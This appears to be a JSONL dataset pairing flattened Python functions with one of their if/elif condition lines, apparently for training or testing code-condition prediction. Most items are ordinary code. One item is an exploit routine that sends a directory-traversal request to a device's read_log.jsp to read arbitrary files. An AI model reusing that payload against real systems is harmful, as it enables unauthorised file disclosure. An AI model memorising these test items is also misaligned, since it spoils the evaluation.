{"input": "def disable_verity(): \"\"\"Disables dm-verity on the device.\"\"\" with log.waitfor(\"Disabling dm-verity on %s\" % context.device): root() with AdbClient() as c: reply = c.disable_verity() if \"Verity already disabled\" in reply: return elif \"Now reboot your device\" in reply: reboot(wait=True) elif \"0006closed\" in reply: return # Emulator doesnt support Verity? else: log.error(\"Could not disable verity:\\n%s\" % reply)", "label": "elif \"Now reboot your device\" in reply :"}
{"input": "def _process_property_change(self, msg): msg = super(Select, self)._process_property_change(msg) if \"value\" in msg: if not self.values: pass elif msg[\"value\"] is None: msg[\"value\"] = self.values[0] else: if isIn(msg[\"value\"], self.unicode_values): idx = indexOf(msg[\"value\"], self.unicode_values) else: idx = indexOf(msg[\"value\"], self.labels) msg[\"value\"] = self._items[self.labels[idx]] msg.pop(\"options\", None) return msg", "label": "if isIn ( msg [ \"value\" ] , self . unicode_values ) :"}
{"input": "def merge(module_name, tree1, tree2): for child in tree2.node: if isinstance(child, ast.Function): replaceFunction(tree1, child.name, child) elif isinstance(child, ast.Assign): replaceAssign(tree1, child.nodes[0].name, child) elif isinstance(child, ast.Class): replaceClassMethods(tree1, child.name, child) else: raise TranslationError( \"Do not know how to merge %s\" % child, child, module_name ) return tree1", "label": "elif isinstance ( child , ast . Class ) :"}
{"input": "def handle(d: dict): for key, value in d.items(): if type(value) == dict: if \"url\" not in value: handle(value) else: global count count += 1", "label": "if type ( value ) == dict :"}
{"input": "def __stop_loggers(self): if self._console_proc: utils.nuke_subprocess(self._console_proc) utils.nuke_subprocess(self._followfiles_proc) self._console_proc = self._followfile_proc = None if self.job: self.job.warning_loggers.discard(self._logfile_warning_stream) self._logfile_warning_stream.close()", "label": "if self . job :"}
{"input": "def unicode_metrics(metrics): for i, metric in enumerate(metrics): for key, value in metric.items(): if isinstance(value, basestring): metric[key] = unicode(value, errors=\"replace\") elif isinstance(value, tuple) or isinstance(value, list): value_list = list(value) for j, value_element in enumerate(value_list): if isinstance(value_element, basestring): value_list[j] = unicode(value_element, errors=\"replace\") metric[key] = tuple(value_list) metrics[i] = metric return metrics", "label": "elif isinstance ( value , tuple ) or isinstance ( value , list ) :"}
{"input": "def __getitem__(self, idx): if isinstance(idx, slice): start, stop, step = idx.indices(len(self)) return [self._revoked_cert(i) for i in range(start, stop, step)] else: idx = operator.index(idx) if idx < 0: idx += len(self) if not 0 <= idx < len(self): raise IndexError return self._revoked_cert(idx)", "label": "if idx < 0 :"}
{"input": "def _get_columns_and_column_names(row): column_names = [] columns = [] duplicate_counter = 1 for i, column_name in enumerate(row): if not column_name: column_name = \"column_{}\".format(xl_col_to_name(i)) if column_name in column_names: column_name = \"{}{}\".format(column_name, duplicate_counter) duplicate_counter += 1 column_names.append(column_name) columns.append( {\"name\": column_name, \"friendly_name\": column_name, \"type\": TYPE_STRING} ) return columns, column_names", "label": "if not column_name :"}
{"input": "def format(self, format, dumper, attrib, data): if data: logger.warn(\"Unexpected data in %s object: %r\", attrib[\"type\"], data) try: return ImageGeneratorObjectType.format(self, format, dumper, attrib, data) except ValueError: if attrib[\"type\"].startswith(\"image+\"): attrib = attrib.copy() attrib[\"type\"] = attrib[\"type\"][6:] return dumper.dump_img(IMAGE, attrib, None)", "label": "if attrib [ \"type\" ] . startswith ( \"image+\" ) :"}
{"input": "def handle_facts_wwn(facts): disk_shares = [] for key, wwn in facts.iteritems(): if not key.startswith(\"wwn_mpath\"): continue path = key.replace(\"wwn_\", \"\") disk_shares.append( { \"serial_number\": normalize_wwn(wwn), \"volume\": \"/dev/mapper/%s\" % path, } ) return disk_shares", "label": "if not key . startswith ( \"wwn_mpath\" ) :"}
{"input": "def _finalize_load(*exc_info): try: success_keys = [k for k in data_keys if k not in failed_keys] if success_keys: self._holder_ref.put_objects_by_keys( session_id, success_keys, pin_token=pin_token ) if exc_info: raise exc_info[1].with_traceback(exc_info[2]) from None if failed_keys: raise StorageFull( request_size=storage_full_sizes[0], capacity=storage_full_sizes[1], affected_keys=list(failed_keys), ) finally: shared_bufs[:] = []", "label": "if success_keys :"}
{"input": "def _get_base64md5(self): if \"md5\" in self.local_hashes and self.local_hashes[\"md5\"]: md5 = self.local_hashes[\"md5\"] if not isinstance(md5, bytes): md5 = md5.encode(\"utf-8\") return binascii.b2a_base64(md5).decode(\"utf-8\").rstrip(\"\\n\")", "label": "if not isinstance ( md5 , bytes ) :"}
{"input": "def tag_configure(self, *args, **keys): trace = False and not g.unitTesting if trace: g.trace(args, keys) if len(args) == 1: key = args[0] self.tags[key] = keys val = keys.get(\"foreground\") underline = keys.get(\"underline\") if val: self.configDict[key] = val if underline: self.configUnderlineDict[key] = True else: g.trace(\"oops\", args, keys)", "label": "if val :"}
{"input": "def _findSubpath(self, path, A, B, inside): print(\"finding\", A, B) sub = None for i in xrange(0, len(path) * 2): # iterate twice with wrap around j = i % len(path) seg = path[j] if inside.isInside(seg.midPoint()): if eq(seg.A, A): sub = Path(\"subp\") print(\"seg\", sub is None, seg) if sub is not None: sub.append(seg) if eq(seg.B, B): break print(\"found\", sub) return sub", "label": "if eq ( seg . A , A ) :"}
{"input": "def indent_block(self, cursor): \"\"\"Indent block after enter pressed\"\"\" at_start_of_line = cursor.positionInBlock() == 0 with self._neditor: cursor.insertBlock() if not at_start_of_line: indent = self._compute_indent(cursor) if indent is not None: cursor.insertText(indent) return True return False self._neditor.ensureCursorVisible()", "label": "if not at_start_of_line :"}
{"input": "def checkpoint(): if checkpoint_asserts: self.assert_integrity_idxs_take() if node in self.idxs_memo: toposort(self.idxs_memo[node]) if node in self.take_memo: for take in self.take_memo[node]: toposort(take)", "label": "if node in self . take_memo :"}
{"input": "def handle(self, *args, **options): with advisory_lock(\"send-notifications-command\", wait=False) as acquired: if acquired: qs = HistoryChangeNotification.objects.all().order_by(\"-id\") for change_notification in iter_queryset(qs, itersize=100): try: send_sync_notifications(change_notification.pk) except HistoryChangeNotification.DoesNotExist: pass else: print(\"Other process already running\")", "label": "if acquired :"}
{"input": "def _parse_version_parts(s): for part in component_re.split(s): part = replace(part, part) if part in [\"\", \".\"]: continue if part[:1] in \"0123456789\": yield part.zfill(8) # pad for numeric comparison else: yield \"*\" + part yield \"*final\" # ensure that alpha/beta/candidate are before final", "label": "if part [ : 1 ] in \"0123456789\" :"}
{"input": "def set_password(user_id): try: user = Journalist.query.get(user_id) except NoResultFound: abort(404) password = request.form.get(\"password\") if set_diceware_password(user, password) is not False: if user.last_token is not None: revoke_token(user, user.last_token) user.session_nonce += 1 db.session.commit() return redirect(url_for(\"admin.edit_user\", user_id=user_id))", "label": "if user . last_token is not None :"}
{"input": "def _get_normal_median_depth(normal_counts): depths = [] with open(normal_counts) as in_handle: header = None for line in in_handle: if header is None and not line.startswith(\"@\"): header = line.strip().split() elif header: n_vals = dict(zip(header, line.strip().split())) depths.append(int(n_vals[\"REF_COUNT\"]) + int(n_vals[\"ALT_COUNT\"])) return np.median(depths)", "label": "if header is None and not line . startswith ( \"@\" ) :"}
{"input": "def _gen_langs_in_db(self): for d in os.listdir(join(self.base_dir, \"db\")): if d in self._non_lang_db_dirs: continue lang_path = join(self.base_dir, \"db\", d, \"lang\") if not exists(lang_path): log.warn( \"unexpected lang-zone db dir without 'lang' file: \" \"`%s' (skipping)\" % dirname(lang_path) ) continue fin = open(lang_path, \"r\") try: lang = fin.read().strip() finally: fin.close() yield lang", "label": "if not exists ( lang_path ) :"}
{"input": "def negate(monad): sql = monad.getsql()[0] translator = monad.translator if translator.dialect == \"Oracle\": result_sql = [\"IS_NULL\", sql] else: result_sql = [\"EQ\", sql, [\"VALUE\", \"\"]] if monad.nullable: if isinstance(monad, AttrMonad): result_sql = [\"OR\", result_sql, [\"IS_NULL\", sql]] else: result_sql = [\"EQ\", [\"COALESCE\", sql, [\"VALUE\", \"\"]], [\"VALUE\", \"\"]] result = BoolExprMonad(result_sql, nullable=False) result.aggregated = monad.aggregated return result", "label": "if monad . nullable :"}
{"input": "def _model_shorthand(self, args): accum = [] for arg in args: if isinstance(arg, Node): accum.append(arg) elif isinstance(arg, Query): accum.append(arg) elif isinstance(arg, ModelAlias): accum.extend(arg.get_proxy_fields()) elif isclass(arg) and issubclass(arg, Model): accum.extend(arg._meta.declared_fields) return accum", "label": "elif isclass ( arg ) and issubclass ( arg , Model ) :"}
{"input": "def get_hashes_from_fingerprint_with_reason(event, fingerprint): default_values = set([\"{{ default }}\", \"{{default}}\"]) if any(d in fingerprint for d in default_values): default_hashes = get_hashes_for_event_with_reason(event) hash_count = len(default_hashes[1]) else: hash_count = 1 hashes = OrderedDict((bit, []) for bit in fingerprint) for idx in xrange(hash_count): for bit in fingerprint: if bit in default_values: hashes[bit].append(default_hashes) else: hashes[bit] = bit return hashes.items()", "label": "if bit in default_values :"}
{"input": "def default(self, obj): if hasattr(obj, \"__json__\"): return obj.__json__() elif isinstance(obj, collections.Iterable): return list(obj) elif isinstance(obj, dt.datetime): return obj.isoformat() elif hasattr(obj, \"__getitem__\") and hasattr(obj, \"keys\"): return dict(obj) elif hasattr(obj, \"__dict__\"): return { member: getattr(obj, member) for member in dir(obj) if not member.startswith(\"_\") and not hasattr(getattr(obj, member), \"__call__\") } return json.JSONEncoder.default(self, obj)", "label": "if not member . startswith ( \"_\" )"}
{"input": "def get_http_auth(self, name): auth = self._config.get(\"http-basic.{}\".format(name)) if not auth: username = self._config.get(\"http-basic.{}.username\".format(name)) password = self._config.get(\"http-basic.{}.password\".format(name)) if not username and not password: return None else: username, password = auth[\"username\"], auth.get(\"password\") if password is None: password = self.keyring.get_password(name, username) return { \"username\": username, \"password\": password, }", "label": "if password is None :"}
{"input": "def add_libdirs(self, envvar, sep, fatal=False): v = os.environ.get(envvar) if not v: return for dir in str.split(v, sep): dir = str.strip(dir) if not dir: continue dir = os.path.normpath(dir) if os.path.isdir(dir): if not dir in self.library_dirs: self.library_dirs.append(dir) elif fatal: fail(\"FATAL: bad directory %s in environment variable %s\" % (dir, envvar))", "label": "if not dir :"}
{"input": "def PARSE_TWO_PARAMS(x, y): \"\"\"used to convert different possible x/y params to a tuple\"\"\" if y is not None: return (x, y) else: if isinstance(x, (list, tuple)): return (x[0], x[1]) else: if isinstance(x, UNIVERSAL_STRING): x = x.strip() if \",\" in x: return [int(w.strip()) for w in x.split(\",\")] return (x, x)", "label": "if \",\" in x :"}
{"input": "def _load_from_sym_dir(self, root): root = os.path.abspath(root) prefix_len = len(root) + 1 for base, _, filenames in os.walk(root): for filename in filenames: if not filename.endswith(\".sym\"): continue path = os.path.join(base, filename) lib_path = \"/\" + path[prefix_len:-4] self.add(lib_path, ELF.load_dump(path))", "label": "if not filename . endswith ( \".sym\" ) :"}
{"input": "def is_vertical(self): if not self.isFloating(): par = self.parent() if par and hasattr(par, \"dockWidgetArea\"): return par.dockWidgetArea(self) in ( Qt.LeftDockWidgetArea, Qt.RightDockWidgetArea, ) return self.size().height() > self.size().width()", "label": "if par and hasattr ( par , \"dockWidgetArea\" ) :"}
{"input": "def writeBit(self, state, endian): if self._bit_pos == 7: self._bit_pos = 0 if state: if endian is BIG_ENDIAN: self._byte |= 1 else: self._byte |= 128 self._output.write(chr(self._byte)) self._byte = 0 else: if state: if endian is BIG_ENDIAN: self._byte |= 1 << self._bit_pos else: self._byte |= 1 << (7 - self._bit_pos) self._bit_pos += 1", "label": "if endian is BIG_ENDIAN :"}
{"input": "def init(self): self.sock.setblocking(True) if self.parser is None: # wrap the socket if needed if self.cfg.is_ssl: self.sock = ssl.wrap_socket( self.sock, server_side=True, **self.cfg.ssl_options ) # initialize the parser self.parser = http.RequestParser(self.cfg, self.sock, self.client)", "label": "if self . cfg . is_ssl :"}
{"input": "def construct_scalar(self, node): if isinstance(node, MappingNode): for key_node, value_node in node.value: if key_node.tag == \"tag:yaml.org,2002:value\": return self.construct_scalar(value_node) return super().construct_scalar(node)", "label": "if key_node . tag == \"tag:yaml.org,2002:value\" :"}
{"input": "def typeNewLine(self, line): if line >= 0: iter = self.buffer.get_iter_at_line(line) if not iter.ends_line(): iter.forward_to_line_end() self.buffer.place_cursor(iter) elif line < 0: iter = self.buffer.get_end_iter() for i in range(line, -1): iter.backward_line() iter.forward_to_line_end() self.buffer.place_cursor(iter) press(self.view, \"\\n\")", "label": "if not iter . ends_line ( ) :"}
{"input": "def _render_ib_interfaces(cls, network_state, iface_contents, flavor): ib_filter = renderer.filter_by_type(\"infiniband\") for iface in network_state.iter_interfaces(ib_filter): iface_name = iface[\"name\"] iface_cfg = iface_contents[iface_name] iface_cfg.kind = \"infiniband\" iface_subnets = iface.get(\"subnets\", []) route_cfg = iface_cfg.routes cls._render_subnets( iface_cfg, iface_subnets, network_state.has_default_route, flavor ) cls._render_subnet_routes(iface_cfg, route_cfg, iface_subnets, flavor)", "label": "iface_subnets = iface . get ( \"subnets\" , [ ] )"}
{"input": "def stop(self): \"\"\"Stops the slapd server, and waits for it to terminate\"\"\" if self._proc is not None: self._log.debug(\"stopping slapd\") if hasattr(self._proc, \"terminate\"): self._proc.terminate() else: import posix, signal posix.kill(self._proc.pid, signal.SIGHUP) # time.sleep(1) # posix.kill(self._proc.pid, signal.SIGTERM) # posix.kill(self._proc.pid, signal.SIGKILL) self.wait()", "label": "if hasattr ( self . _proc , \"terminate\" ) :"}
{"input": "def _listen(self, consumer_id: str) -> AsyncIterable[Any]: try: while True: if self._listening: async for msg in self._listen_to_queue(consumer_id): if msg is not None: yield msg await asyncio.sleep(0.5) else: async for msg in self._listen_to_ws(): yield msg except asyncio.CancelledError: pass except Exception as e: raise e", "label": "if self . _listening :"}
{"input": "def discover_misago_admin(): for app in apps.get_app_configs(): module = import_module(app.name) if not hasattr(module, \"admin\"): continue admin_module = import_module(\"%s.admin\" % app.name) if hasattr(admin_module, \"MisagoAdminExtension\"): extension = getattr(admin_module, \"MisagoAdminExtension\")() if hasattr(extension, \"register_navigation_nodes\"): extension.register_navigation_nodes(site) if hasattr(extension, \"register_urlpatterns\"): extension.register_urlpatterns(urlpatterns)", "label": "if hasattr ( extension , \"register_navigation_nodes\" ) :"}
{"input": "def update_job(self, job): if not self.redis.hexists(self.jobs_key, job.id): raise JobLookupError(job.id) with self.redis.pipeline() as pipe: pipe.hset( self.jobs_key, job.id, pickle.dumps(job.__getstate__(), self.pickle_protocol), ) if job.next_run_time: pipe.zadd( self.run_times_key, {job.id: datetime_to_utc_timestamp(job.next_run_time)}, ) else: pipe.zrem(self.run_times_key, job.id) pipe.execute()", "label": "if job . next_run_time :"}
{"input": "def _get_first_available_entry_node(self) -> Optional[str]: for entry_node in self.entry_nodes: if entry_node not in self.locked_entry_nodes: _, wait_until = self._parse_entry_node(entry_node) now = time.time() if wait_until <= now: return entry_node return None", "label": "if wait_until <= now :"}
{"input": "def answers(self, other): if not isinstance(other, TCP): return 0 if conf.checkIPsrc: if not ((self.sport == other.sport) and (self.dport == other.dport)): return 0 if conf.check_TCPerror_seqack: if self.seq is not None: if self.seq != other.seq: return 0 if self.ack is not None: if self.ack != other.ack: return 0 return 1", "label": "if self . ack != other . ack :"}
{"input": "def run(self): if self.check(): path = \"/BWT/utils/logs/read_log.jsp?filter=&log=../../../../../../../../..{}\".format( self.filename ) response = self.http_request(method=\"GET\", path=path) if response and response.status_code == 200 and len(response.text): print_success(\"Exploit success\") print_status(\"Reading file: {}\".format(self.filename)) print_info(response.text) else: print_error(\"Exploit failed - could not read file\") else: print_error(\"Exploit failed - device seems to be not vulnerable\")", "label": "if response and response . status_code == 200 and len ( response . text ) :"}
{"input": "def write(self, s): if self.closed: raise ValueError(\"write to closed file\") if type(s) not in (unicode, str, bytearray): # See issue #19481 if isinstance(s, unicode): s = unicode.__getitem__(s, slice(None)) elif isinstance(s, str): s = str.__str__(s) elif isinstance(s, bytearray): s = bytearray.__str__(s) else: raise TypeError(\"must be string, not \" + type(s).__name__) return self.shell.write(s, self.tags)", "label": "elif isinstance ( s , str ) :"}
{"input": "def test_checkblock_valid(self): for comment, fHeader, fCheckPoW, cur_time, blk in load_test_vectors( \"checkblock_valid.json\" ): try: if fHeader: CheckBlockHeader(blk, fCheckPoW=fCheckPoW, cur_time=cur_time) else: CheckBlock(blk, fCheckPoW=fCheckPoW, cur_time=cur_time) except ValidationError as err: self.fail('Failed \"%s\" with error %r' % (comment, err))", "label": "if fHeader :"}
{"input": "def _lookup_fqdn(ip): try: return [socket.getfqdn(socket.gethostbyaddr(ip)[0])] except socket.herror as err: if err.errno in (0, HOST_NOT_FOUND, NO_DATA): # No FQDN for this IP address, so we don't need to know this all the time. log.debug(\"Unable to resolve address %s: %s\", ip, err) else: log.error(err_message, err) except (socket.error, socket.gaierror, socket.timeout) as err: log.error(err_message, err)", "label": "if err . errno in ( 0 , HOST_NOT_FOUND , NO_DATA ) :"}
{"input": "def send_telnet(self, *args: str): try: shell = TelnetShell(self.host) for command in args: if command == \"ftp\": shell.check_or_download_busybox() shell.run_ftp() else: shell.exec(command) shell.close() except Exception as e: _LOGGER.exception(f\"Telnet command error: {e}\")", "label": "if command == \"ftp\" :"}
{"input": "def write(path, data, kind=\"OTHER\", dohex=0): asserttype1(data) kind = string.upper(kind) try: os.remove(path) except os.error: pass err = 1 try: if kind == \"LWFN\": writelwfn(path, data) elif kind == \"PFB\": writepfb(path, data) else: writeother(path, data, dohex) err = 0 finally: if err and not DEBUG: try: os.remove(path) except os.error: pass", "label": "if kind == \"LWFN\" :"}
{"input": "def ApplyInScriptedSection(self, codeBlock, fn, args): self.BeginScriptedSection() try: try: # print \"ApplyInSS\", codeBlock, fn, args return self._ApplyInScriptedSection(fn, args) finally: if self.debugManager: self.debugManager.OnLeaveScript() self.EndScriptedSection() except: self.HandleException(codeBlock)", "label": "if self . debugManager :"}
{"input": "def _escape_attrib(text): # escape attribute value try: if \"&\" in text: text = text.replace(\"&\", \"&amp;\") if \"<\" in text: text = text.replace(\"<\", \"&lt;\") if \">\" in text: text = text.replace(\">\", \"&gt;\") if '\"' in text: text = text.replace('\"', \"&quot;\") if \"\\n\" in text: text = text.replace(\"\\n\", \"&#10;\") return text except (TypeError, AttributeError): # pragma: no cover _raise_serialization_error(text)", "label": "if \"<\" in text :"}
{"input": "def compile_relation(self, method, expr, range_list, negated=False): ranges = [] for item in range_list[1]: if item[0] == item[1]: ranges.append(self.compile(item[0])) else: ranges.append(\"%s..%s\" % tuple(map(self.compile, item))) return \"%s%s %s %s\" % ( self.compile(expr), negated and \" not\" or \"\", method, \",\".join(ranges), )", "label": "if item [ 0 ] == item [ 1 ] :"}
{"input": "def emptyTree(self): for child in self: childObj = child.getObject() del childObj[NameObject(\"/Parent\")] if NameObject(\"/Next\") in childObj: del childObj[NameObject(\"/Next\")] if NameObject(\"/Prev\") in childObj: del childObj[NameObject(\"/Prev\")] if NameObject(\"/Count\") in self: del self[NameObject(\"/Count\")] if NameObject(\"/First\") in self: del self[NameObject(\"/First\")] if NameObject(\"/Last\") in self: del self[NameObject(\"/Last\")]", "label": "if NameObject ( \"/Prev\" ) in childObj :"}
{"input": "def connect_to_uri(self, uri, autoconnect=None, do_start=True): try: conn = self._check_conn(uri) if not conn: # Unknown connection, add it conn = self.add_conn(uri) if autoconnect is not None: conn.set_autoconnect(bool(autoconnect)) self.show_manager() if do_start: conn.open() return conn except Exception: logging.exception(\"Error connecting to %s\", uri) return None", "label": "if do_start :"}
{"input": "def get_expression(self): \"\"\"Return the expression as a printable string.\"\"\" l = [] for c in self.content: if c.op is not None: # only applies to first cell l.append(c.op) if c.child is not None: l.append(\"(\" + c.child.get_expression() + \")\") else: l.append(\"%d\" % c.get_value()) return \"\".join(l)", "label": "if c . child is not None :"}
{"input": "def to_word_end(view, s): if mode == modes.NORMAL: pt = word_end_reverse(view, s.b, count) return sublime.Region(pt) elif mode in (modes.VISUAL, modes.VISUAL_BLOCK): if s.a < s.b: pt = word_end_reverse(view, s.b - 1, count) if pt > s.a: return sublime.Region(s.a, pt + 1) return sublime.Region(s.a + 1, pt) pt = word_end_reverse(view, s.b, count) return sublime.Region(s.a, pt) return s", "label": "if s . a < s . b :"}
{"input": "def whichmodule(obj, name): \"\"\"Find the module an object belong to.\"\"\" module_name = getattr(obj, \"__module__\", None) if module_name is not None: return module_name # Protect the iteration by using a list copy of sys.modules against dynamic # modules that trigger imports of other modules upon calls to getattr. for module_name, module in sys.modules.copy().items(): if module_name == \"__main__\" or module is None: continue try: if _getattribute(module, name)[0] is obj: return module_name except AttributeError: pass return \"__main__\"", "label": "if module_name == \"__main__\" or module is None :"}
{"input": "def summarize_scalar_dict(name_data, step, name_scope=\"Losses/\"): if name_data: with tf.name_scope(name_scope): for name, data in name_data.items(): if data is not None: tf.compat.v2.summary.scalar(name=name, data=data, step=step)", "label": "if data is not None :"}
{"input": "def TryMerge(self, d): while d.avail() > 0: tt = d.getVarInt32() if tt == 10: self.set_content(d.getPrefixedString()) continue if tt == 18: self.set_blob_key(d.getPrefixedString()) continue if tt == 24: self.set_width(d.getVarInt32()) continue if tt == 32: self.set_height(d.getVarInt32()) continue if tt == 0: raise ProtocolBuffer.ProtocolBufferDecodeError d.skipData(tt)", "label": "if tt == 10 :"}
{"input": "def gather_files(fileset): common_type = get_common_filetype(fileset) files = [] for file in fileset.file: filename = file.name if file.is_include_file == True: filename = {} filename[file.name] = {\"is_include_file\": True} if file.file_type != common_type: if type(filename) == str: filename = {} filename[file.name] = {\"file_type\": file.file_type} files.append(filename) return files", "label": "if file . file_type != common_type :"}
{"input": "def data(self, index: QModelIndex, role=Qt.DisplayRole): if not index.isValid(): return None if role == Qt.DisplayRole or role == Qt.EditRole: i = index.row() j = index.column() fieldtype = self.field_types[i] if j == 0: return fieldtype.caption elif j == 1: return fieldtype.function.name elif j == 2: return ProtocolLabel.DISPLAY_FORMATS[fieldtype.display_format_index]", "label": "if j == 0 :"}
{"input": "def format_coord(x, y): # callback function to format coordinate display in toolbar x = int(x + 0.5) y = int(y + 0.5) try: if dims: return \"%s @ %s [%4i, %4i]\" % (cur_ax_dat[1][y, x], current, x, y) else: return \"%s @ [%4i, %4i]\" % (data[y, x], x, y) except IndexError: return \"\"", "label": "if dims :"}
{"input": "def getAllUIExtensions(self): extensions = [] if getExecutionCodeType() == \"MEASURE\": text = getMeasurementResultString(self) extensions.append(TextUIExtension(text)) errorType = self.getErrorHandlingType() if errorType in (\"MESSAGE\", \"EXCEPTION\"): data = infoByNode[self.identifier] message = data.errorMessage if message is not None and data.showErrorMessage: extensions.append(ErrorUIExtension(message)) extraExtensions = self.getUIExtensions() if extraExtensions is not None: extensions.extend(extraExtensions) return extensions", "label": "if message is not None and data . showErrorMessage :"}
{"input": "def on_notify(self, notification): subject = notification[\"subject\"] if subject.startswith(\"remote_recording.\"): if \"should_start\" in subject and self.online: session_name = notification[\"session_name\"] self.sensor.set_control_value(\"capture_session_name\", session_name) self.sensor.set_control_value(\"local_capture\", True) elif \"should_stop\" in subject: self.sensor.set_control_value(\"local_capture\", False)", "label": "elif \"should_stop\" in subject :"}
{"input": "def _log_conn_errors(self): if \"connection\" in self.event.data: cinfo = self.event.data[\"connection\"] if not cinfo.get(\"live\"): err_msg = cinfo.get(\"error\", [None, None])[1] if err_msg: self._log_status(err_msg)", "label": "if not cinfo . get ( \"live\" ) :"}
{"input": "def setChanged(self, c, changed): # Find the tab corresponding to c. dw = c.frame.top # A DynamicWindow i = self.indexOf(dw) if i < 0: return s = self.tabText(i) s = g.u(s) if len(s) > 2: if changed: if not s.startswith(\"* \"): title = \"* \" + s self.setTabText(i, title) else: if s.startswith(\"* \"): title = s[2:] self.setTabText(i, title)", "label": "if not s . startswith ( \"* \" ) :"}
{"input": "def load_file_in_same_dir(ref_file, filename): \"\"\"Load a given file. Works even when the file is contained inside a zip.\"\"\" from couchpotato.core.helpers.encoding import toUnicode path = split_path(toUnicode(ref_file))[:-1] + [filename] for i, p in enumerate(path): if p.endswith(\".zip\"): zfilename = os.path.join(*path[: i + 1]) zfile = zipfile.ZipFile(zfilename) return zfile.read(\"/\".join(path[i + 1 :])) return u(io.open(os.path.join(*path), encoding=\"utf-8\").read())", "label": "if p . endswith ( \".zip\" ) :"}
{"input": "def __mpcReadyInSlaveMode(self): while True: time.sleep(10) if not win32gui.IsWindow(self.__listener.mpcHandle): if self.callbacks.onMpcClosed: self.callbacks.onMpcClosed(None) break", "label": "if self . callbacks . onMpcClosed :"}
{"input": "def _invalidate(self, resource_group_name: str, scale_set_name: str) -> None: with self._lock: if (resource_group_name, scale_set_name) in self._instance_cache: del self._instance_cache[(resource_group_name, scale_set_name)] if resource_group_name in self._scale_set_cache: del self._scale_set_cache[resource_group_name] if resource_group_name in self._remaining_instances_cache: del self._remaining_instances_cache[resource_group_name]", "label": "if ( resource_group_name , scale_set_name ) in self . _instance_cache :"}
{"input": "def close(self): if self._serial is not None: try: self._serial.cancel_read() if self._reading_thread: self._reading_thread.join() finally: try: self._serial.close() self._serial = None except Exception: logging.exception(\"Couldn't close serial\")", "label": "if self . _reading_thread :"}
{"input": "def channel_sizes(self): \"\"\"List of channel sizes: [(width, height)].\"\"\" sizes = [] for channel in self.channel_info: if channel.id == ChannelID.USER_LAYER_MASK: sizes.append((self.mask_data.width, self.mask_data.height)) elif channel.id == ChannelID.REAL_USER_LAYER_MASK: sizes.append((self.mask_data.real_width, self.mask_data.real_height)) else: sizes.append((self.width, self.height)) return sizes", "label": "if channel . id == ChannelID . USER_LAYER_MASK :"}
{"input": "def get_module_settings(): included_setting = [] module = DataGetter.get_module() if module is not None: if module.ticket_include: included_setting.append(\"ticketing\") if module.payment_include: included_setting.append(\"payments\") if module.donation_include: included_setting.append(\"donations\") return included_setting", "label": "if module . payment_include :"}
{"input": "def _format_block( self, prefix: str, lines: List[str], padding: str = None ) -> List[str]: if lines: if padding is None: padding = \" \" * len(prefix) result_lines = [] for i, line in enumerate(lines): if i == 0: result_lines.append((prefix + line).rstrip()) elif line: result_lines.append(padding + line) else: result_lines.append(\"\") return result_lines else: return [prefix]", "label": "if padding is None :"}
{"input": "def get_task_by_id(events, task_id): if hasattr(Task, \"_fields\"): # Old version return events.state.tasks.get(task_id) else: _fields = Task._defaults.keys() task = events.state.tasks.get(task_id) if task is not None: task._fields = _fields return task", "label": "if task is not None :"}
{"input": "def check(self, value): try: if isinstance(value, decimal.Decimal): v = value else: v = decimal.Decimal(str(value).replace(self.dot, \".\")) return v, None except (ValueError, TypeError, decimal.InvalidOperation): return value, translate(self.message)", "label": "if isinstance ( value , decimal . Decimal ) :"}
{"input": "def check_sales_order_on_hold_or_close(self, ref_fieldname): for d in self.get(\"items\"): if d.get(ref_fieldname): status = frappe.db.get_value(\"Sales Order\", d.get(ref_fieldname), \"status\") if status in (\"Closed\", \"On Hold\"): frappe.throw( _(\"Sales Order {0} is {1}\").format(d.get(ref_fieldname), status) )", "label": "if d . get ( ref_fieldname ) :"}
{"input": "def nested_match(expect, value): if expect == value: return True if isinstance(expect, dict) and isinstance(value, dict): for k, v in expect.items(): if k in value: if not nested_match(v, value[k]): return False else: return False return True if isinstance(expect, list) and isinstance(value, list): for x, y in zip(expect, value): if not nested_match(x, y): return False return True return False", "label": "if not nested_match ( x , y ) :"}
{"input": "def test_setup_app_sets_loader(self, app): prev = os.environ.get(\"CELERY_LOADER\") try: cmd = MockCommand(app=app) cmd.setup_app_from_commandline([\"--loader=X.Y:Z\"]) assert os.environ[\"CELERY_LOADER\"] == \"X.Y:Z\" finally: if prev is not None: os.environ[\"CELERY_LOADER\"] = prev else: del os.environ[\"CELERY_LOADER\"]", "label": "if prev is not None :"}
{"input": "def set_labels_for_constraints(self, constraints): for label in self._constraints_to_label_args(constraints): if label not in self.labels: log.info( \"setting node '%s' label '%s' to '%s'\", self.name, label.name, label.value, ) self.label_add(label.name, label.value)", "label": "if label not in self . labels :"}
{"input": "def _match(self, byte_chunk): quote_character = None data = byte_chunk.nhtml open_angle_bracket = data.rfind(\"<\") # We are inside <... if open_angle_bracket <= data.rfind(\">\"): return False for s in data[open_angle_bracket + 1 :]: if s in ATTR_DELIMITERS: if quote_character and s == quote_character: quote_character = None continue elif not quote_character: quote_character = s continue if quote_character == self.quote_character: return True return False", "label": "if quote_character and s == quote_character :"}
{"input": "def _display_history(config, script, base, head, currents=()): for sc in script.walk_revisions(base=base or \"base\", head=head or \"heads\"): if indicate_current: sc._db_current_indicator = sc.revision in currents config.print_stdout( sc.cmd_format( verbose=verbose, include_branches=True, include_doc=True, include_parents=True, ) )", "label": "if indicate_current :"}
{"input": "def set(self, key=None, value=None): if key is not None: k = str(key) if value is not None: self.store[k] = value else: if self.store.has_key(k): del self.store[k] else: self.store.clear()", "label": "if self . store . has_key ( k ) :"}
{"input": "def _finalize_load(*exc_info): try: success_keys = [k for k in data_keys if k not in failed_keys] if success_keys: self._holder_ref.put_objects_by_keys( session_id, success_keys, pin_token=pin_token ) if exc_info: raise exc_info[1].with_traceback(exc_info[2]) from None if failed_keys: raise StorageFull( request_size=storage_full_sizes[0], capacity=storage_full_sizes[1], affected_keys=list(failed_keys), ) finally: shared_bufs[:] = []", "label": "if exc_info :"}
{"input": "def ignore_module(module): result = False for check in ignore_these: if \"/*\" in check: if check[:-1] in module: result = True else: if (os.getcwd() + \"/\" + check + \".py\") == module: result = True if result: print_warning(\"Ignoring module: \" + module) return result", "label": "if ( os . getcwd ( ) + \"/\" + check + \".py\" ) == module :"}
{"input": "def available(self, exception_flag=True): \"\"\"True if the solver is available\"\"\" if exception_flag is False: return cplex_import_available else: if cplex_import_available is False: raise ApplicationError( \"No CPLEX <-> Python bindings available - CPLEX direct \" \"solver functionality is not available\" ) else: return True", "label": "if cplex_import_available is False :"}
